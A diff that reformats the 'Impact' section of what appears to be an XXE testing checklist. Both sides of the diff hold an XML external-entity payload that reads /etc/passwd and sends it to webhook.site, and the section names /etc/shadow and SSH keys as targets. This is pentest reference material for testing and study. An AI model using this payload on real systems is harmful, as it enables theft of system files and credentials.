@@ -97,22 +97,26 @@ xml:
   8. **Test for code execution
       * Tag Injection
   
-  #### Impact
-  1. **Can we read sensitive files?**  
-      * Configuration files (e.g., `/etc/passwd`)  
-      * System files (e.g., `/etc/shadow`)  
-      * SQLite files  
-      * SSH keys (e.g., `~/.ssh/id_rsa`)  
+#### Impact
 
-  2. **Can we exfiltrate sensitive information?**
-      * <?xml version="1.0" encoding="UTF-8"?>  
-        <!DOCTYPE foo [  
-          <!ENTITY xxe SYSTEM "file:///etc/passwd">  
-          <!ENTITY % remote SYSTEM "https://webhook.site/?data=%xxe;">  
-          %remote;  
-        ]>  
-        <foo>&xxe;</foo>  
-  3. **Can we achieve code execution?**  
+1. **Can we read sensitive files?**
+
+   - Configuration files (e.g., `/etc/passwd`)
+   - System files (e.g., `/etc/shadow`)
+   - SQLite files
+   - SSH keys (e.g., `~/.ssh/id_rsa`)
+
+2. **Can we exfiltrate sensitive information?**
+
+   - <?xml version="1.0" encoding="UTF-8"?>  
+     <!DOCTYPE foo [  
+       <!ENTITY xxe SYSTEM "file:///etc/passwd">  
+       <!ENTITY % remote SYSTEM "https://webhook.site/?data=%xxe;">  
+       %remote;  
+     ]>  
+     <foo>&xxe;</foo>
+
+  4. **Can we achieve code execution?**  
   
 </details>
 
